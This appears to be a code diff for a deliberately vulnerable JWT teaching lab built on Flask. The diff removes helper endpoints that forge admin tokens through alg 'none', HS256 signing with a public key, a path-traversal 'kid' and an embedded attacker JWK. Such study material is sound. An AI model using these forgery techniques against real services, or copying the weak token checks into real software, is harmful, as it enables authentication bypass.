@@ -1,12 +1,8 @@
-import base64
-import hashlib
-import hmac
-import json
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
 import jwt
-from flask import Flask, jsonify, render_template, request
+from flask import Flask, jsonify, request
 
 from app.key_material import KEY_DIR, ensure_key_material, read_task2_private_key, read_task2_public_key
 from app.security import (
@@ -84,36 +80,20 @@ def _auth_error(exc: AuthError):
     return jsonify({"ok": False, "error": str(exc)}), 401
 
 
-def _b64url_encode(data: bytes) -> str:
-    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
-
-
-def _b64url_decode_segment(segment: str) -> bytes:
-    padding = "=" * (-len(segment) % 4)
-    return base64.urlsafe_b64decode(segment + padding)
-
-
-def _forge_hs256(header: dict, payload: dict, secret: bytes) -> str:
-    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-    signing_input = f"{h}.{p}"
-    sig = hmac.new(secret, signing_input.encode("ascii"), hashlib.sha256).digest()
-    return f"{signing_input}.{_b64url_encode(sig)}"
-
-
-def _parse_token_body(token: str) -> tuple[dict, dict]:
-    try:
-        h_b64, p_b64, _ = token.split(".")
-    except ValueError:
-        raise ValueError("not a three-part JWT")
-    header = json.loads(_b64url_decode_segment(h_b64))
-    payload = json.loads(_b64url_decode_segment(p_b64))
-    return header, payload
-
-
 @app.get("/")
 def index():
-    return render_template("index.html")
+    return jsonify(
+        {
+            "lab": "JWT Vulnerabilities Laboratory",
+            "tasks": {
+                "task1": ["/task1/login", "/task1/admin"],
+                "task2": ["/task2/login", "/task2/public.pem", "/task2/admin"],
+                "task3": ["/task3/login", "/task3/admin"],
+                "task4": ["/task4/login", "/task4/admin"],
+                "fixed": ["/fixed/login", "/fixed/admin"],
+            },
+        }
+    )
 
 
 @app.get("/health")
@@ -248,73 +228,3 @@ def task3_write_attacker_key():
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_text("student-controlled-secret", encoding="utf-8")
     return jsonify({"ok": True, "path": str(path)})
-
-
-# ── UI exploit endpoints ──────────────────────────────────────────
-
-@app.post("/api/exploit/task1")
-def api_exploit_task1():
-    token = (request.get_json(silent=True) or {}).get("token", "")
-    try:
-        header, payload = _parse_token_body(token)
-    except (ValueError, Exception) as exc:
-        return jsonify({"error": str(exc)}), 400
-    header["alg"] = "none"
-    header.pop("kid", None)
-    payload["role"] = "admin"
-    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
-    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-    return jsonify({"forged_token": f"{h}.{p}."})
-
-
-@app.post("/api/exploit/task2")
-def api_exploit_task2():
-    token = (request.get_json(silent=True) or {}).get("token", "")
-    try:
-        header, payload = _parse_token_body(token)
-    except (ValueError, Exception) as exc:
-        return jsonify({"error": str(exc)}), 400
-    header["alg"] = "HS256"
-    header["kid"] = "task2"
-    payload["role"] = "admin"
-    secret = read_task2_public_key().encode("utf-8")
-    return jsonify({"forged_token": _forge_hs256(header, payload, secret)})
-
-
-_ATTACKER_SECRET = b"student-controlled-secret"
-_TRAVERSAL_KID = "../../../tmp/jwt-lab/attacker.key"
-
-
-@app.post("/api/exploit/task4")
-def api_exploit_task4():
-    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
-    from jwt.algorithms import RSAAlgorithm
-
-    token = (request.get_json(silent=True) or {}).get("token", "")
-    try:
-        _, payload = _parse_token_body(token)
-    except (ValueError, Exception) as exc:
-        return jsonify({"error": str(exc)}), 400
-
-    private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    jwk = json.loads(RSAAlgorithm.to_jwk(private_key.public_key()))
-    payload["role"] = "admin"
-    forged = jwt.encode(payload, private_key, algorithm="RS256", headers={"jwk": jwk, "kid": "task4"})
-    return jsonify({"forged_token": forged})
-
-
-@app.post("/api/exploit/task3")
-def api_exploit_task3():
-    attacker_key = Path("/tmp/jwt-lab/attacker.key")
-    attacker_key.parent.mkdir(parents=True, exist_ok=True)
-    attacker_key.write_text(_ATTACKER_SECRET.decode(), encoding="utf-8")
-
-    token = (request.get_json(silent=True) or {}).get("token", "")
-    try:
-        header, payload = _parse_token_body(token)
-    except (ValueError, Exception) as exc:
-        return jsonify({"error": str(exc)}), 400
-    header["alg"] = "HS256"
-    header["kid"] = _TRAVERSAL_KID
-    payload["role"] = "admin"
-    return jsonify({"forged_token": _forge_hs256(header, payload, _ATTACKER_SECRET)})
